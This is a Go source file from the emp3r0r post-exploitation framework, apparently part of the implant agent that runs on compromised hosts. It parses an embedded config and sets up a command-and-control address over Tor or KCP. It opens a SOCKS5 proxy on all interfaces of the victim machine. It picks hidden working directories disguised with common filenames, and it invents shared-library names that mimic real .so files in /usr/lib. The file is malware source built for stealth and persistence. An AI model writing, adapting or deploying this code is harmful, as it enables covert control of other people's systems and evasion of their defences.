package common

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/txthinking/socks5"
)

var RuntimeConfig = &def.Config{}

// Remember writable locations for later use
var WritableLocations = []string{}

func InitConfig() (err error) {
	configData, err := util.ExtractData()
	if err != nil {
		return fmt.Errorf("read config: %v", err)
	}

	// parse CBOR
	err = def.ReadCBORConfig(configData, RuntimeConfig)
	if err != nil {
		short_view := configData
		if len(configData) > 100 {
			short_view = configData[:100]
		}
		return fmt.Errorf("parsing %d bytes of CBOR data (%s...): %v", len(configData), short_view, err)
	}

	// Deprecated: AgentRoot and UtilsPath are no longer used

	// CC Address
	def.CCAddress = RuntimeConfig.CCAddress
	isTor := netutil.IsTor(def.CCAddress)
	if !isTor {
		// check if it is an onion address without scheme
		host := def.CCAddress
		if strings.Contains(host, ":") {
			host = strings.Split(host, ":")[0]
		}
		if strings.HasSuffix(host, ".onion") {
			isTor = true
		}
	}

	if isTor {
		// if scheme is missing, add http
		if !strings.HasPrefix(def.CCAddress, "http") {
			def.CCAddress = fmt.Sprintf("http://%s", def.CCAddress)
		}
		// if port is missing, add 80? No, Tor handles it.
		// ensure no trailing slash
		def.CCAddress = strings.TrimSuffix(def.CCAddress, "/")

		if RuntimeConfig.C2TransportProxy == "" {
			RuntimeConfig.C2TransportProxy = "socks5://127.0.0.1:9050"
		}
	} else if RuntimeConfig.UseKCP {
		RuntimeConfig.CCPort = RuntimeConfig.KCPClientPort
		def.CCAddress = fmt.Sprintf("https://127.0.0.1:%s", RuntimeConfig.CCPort)
	} else {
		def.CCAddress = fmt.Sprintf("https://%s:%s", def.CCAddress, RuntimeConfig.CCPort)
	}

	// CA
	transport.CACrtPEM = []byte(RuntimeConfig.CAPEM)

	// find a writable location for other uses if any
	_, err = GetRandomWritablePath()
	if err != nil {
		logging.Printf("GetRandomWritablePath: %v", err)
	}

	// Socks5 proxy server
	addr := fmt.Sprintf("0.0.0.0:%s", RuntimeConfig.AgentSocksServerPort)
	def.ProxyServer, err = socks5.NewClassicServer(
		addr, "", // listen on emp3r0r_proxy_port
		RuntimeConfig.ShadowsocksLocalSocksPort, // used as socks5 username
		RuntimeConfig.Password,                  // socks5 password
		RuntimeConfig.AgentSocksTimeout,
		RuntimeConfig.AgentSocksTimeout)
	return
}

// GetRandomWritablePath get a random writable path for privileged or normal user
func GetRandomWritablePath() (string, error) {
	var paths []string
	root_path := os.TempDir()
	if !util.IsDirWritable(root_path) {
		root_path = "/tmp"
		if runtime.GOOS == "windows" {
			root_path, _ = os.Getwd()
		}
	}
	if hasRoot() {
		root_path = "/var"
		if runtime.GOOS == "windows" {
			root_path = "C:\\"
		}
	}

	// Helper function to append writable paths
	appendWritablePaths := func(basePath string) {
		writablePaths, err := util.GetWritablePaths(basePath, 4, 100)
		if err == nil {
			paths = append(paths, writablePaths...)
		}
	}

	appendWritablePaths(root_path)

	homeDir, err := os.UserHomeDir()
	if err == nil {
		appendWritablePaths(homeDir)
	}
	WritableLocations = paths // remember writable locations

	// find a writable location to use as agent root

	just_get_one := func() (string, error) {
		rand_common_path := def.CommonFilenames[util.RandInt(0, len(def.CommonFilenames))]
		suffixes := []string{"_tmp", "_temp", "_backup", "_copy"}
		rand_suffix := suffixes[util.RandInt(0, len(suffixes))]
		if util.IsExist(rand_common_path) {
			rand_common_path += rand_suffix
		}
		// abosolute path
		rand_common_path = fmt.Sprintf("%s/%s", root_path, rand_common_path)

		// make depth level higher
		if strings.Count(rand_common_path, "/") < 2 {
			level2Name := def.CommonFilenames[util.RandInt(0, len(def.CommonFilenames))]
			rand_common_path = fmt.Sprintf("%s/%s", rand_common_path, level2Name)
			// mkdir
			if err := os.MkdirAll(rand_common_path, 0o755); err != nil {
				return os.Getwd()
			}
		}

		// make sure it's writable
		if !util.IsDirWritable(rand_common_path) {
			return os.Getwd()
		}

		return rand_common_path, nil
	}

	if len(paths) == 0 {
		return just_get_one()
	}

	// Filter paths to ensure they are level 2 or above
	var level2Paths []string
	var rand_path string
	for _, path := range paths {
		if strings.Count(path, "/") >= 2 {
			level2Paths = append(level2Paths, path)
		}
	}
	if len(level2Paths) == 0 {
		return just_get_one()
	}
	rand_path = level2Paths[util.RandInt(0, len(level2Paths))]

	if !strings.HasSuffix(rand_path, "/") {
		rand_path += "/"
	}
	return rand_path, nil
}

// NameTheLibrary generates a random name for a shared library
func NameTheLibrary() string {
	// Define the directory to search for .so files
	searchDir := "/usr/lib"

	// Slice to hold found .so files
	var soFiles []string

	// Walk the directory to find .so files
	err := filepath.Walk(searchDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if strings.HasSuffix(info.Name(), ".so") {
			soFiles = append(soFiles, path)
		}
		return nil
	})
	if err != nil {
		logging.Println("Error scanning for .so files:", err)
		return ""
	}

	// Check if any .so files were found
	if len(soFiles) == 0 {
		logging.Println("No .so files found")
		return ""
	}

	// Get a random .so file
	randSoFile := soFiles[util.RandInt(0, len(soFiles))]

	// Generate a random version number
	version := fmt.Sprintf("%d.%d", util.RandInt(0, 10), util.RandInt(0, 10))

	// Construct the proposed name
	proposedName := fmt.Sprintf("%s.%s", filepath.Base(randSoFile), version)

	return proposedName
}

func hasRoot() bool {
	return os.Getuid() == 0
}
